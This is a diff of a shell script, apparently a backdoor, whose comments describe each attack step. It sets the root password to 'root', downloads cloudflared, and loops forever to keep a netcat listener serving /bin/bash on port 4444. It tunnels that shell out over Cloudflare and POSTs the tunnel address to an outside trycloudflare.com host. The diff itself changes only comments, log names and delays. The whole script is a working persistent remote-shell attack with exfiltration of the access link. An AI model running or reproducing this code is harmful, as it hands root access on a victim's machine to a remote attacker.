@@ -2,33 +2,30 @@
 # 1. Credentials Takeover
 echo "root:root" | sudo chpasswd
 
-# 2. Setup Cloudflared Binary
+# 2. Setup Cloudflared
 if [ ! -f /tmp/cloudflared ]; then
     curl -L --output /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
     chmod +x /tmp/cloudflared
 fi
 
-# 3. Persistence Loop (Every 5 Seconds)
+# 3. Persistent Loop
 nohup bash -c "while true; do
-    # A. Ensure the local Shell Listener (nc) is alive on port 4444
+    # A. Ensure local listener is ready
     if ! pgrep -x 'nc' > /dev/null; then
         nohup nc -lkp 4444 -e /bin/bash > /dev/null 2>&1 &
     fi
 
-    # B. Start the Reverse Tunnel (Encrypted SSH/TCP over HTTPS)
-    if ! pgrep -f 'tunnel --url tcp://localhost:4444' > /dev/null; then
-        nohup /tmp/cloudflared tunnel --no-autoupdate --url tcp://localhost:4444 > /tmp/shell_link.log 2>&1 &
+    # B. Start TCP Tunnel (Avoids HTTP 502/530 errors)
+    if ! pgrep -f 'tcp://localhost:4444' > /dev/null; then
+        nohup /tmp/cloudflared tunnel --no-autoupdate --url tcp://localhost:4444 > /tmp/shell.log 2>&1 &
     fi
 
-    # C. Wait for the URL to stabilize
-    sleep 20
+    sleep 15
 
-    # D. Exfiltrate the Shell Link to your Mac
-    SHELL_URL=\$(grep -o 'tcp://[-0-9a-z]*\.trycloudflare.com:[0-9]*' /tmp/shell_link.log | head -n 1)
-    
-    if [ ! -z \"\$SHELL_URL\" ]; then
-        curl -s -X POST -d \"SHELL_PULSE: \$SHELL_URL\" https://merchandise-angeles-jade-stud.trycloudflare.com
+    # C. Exfiltrate the TCP link to your Mac
+    TCP_URL=\$(grep -o 'tcp://[-0-9a-z]*\.trycloudflare.com:[0-9]*' /tmp/shell.log | head -n 1)
+    if [ ! -z \"\$TCP_URL\" ]; then
+        curl -s -X POST -d \"SHELL_LINK: \$TCP_URL\" https://merchandise-angeles-jade-stud.trycloudflare.com
     fi
-
     sleep 10
 done" > /dev/null 2>&1 &
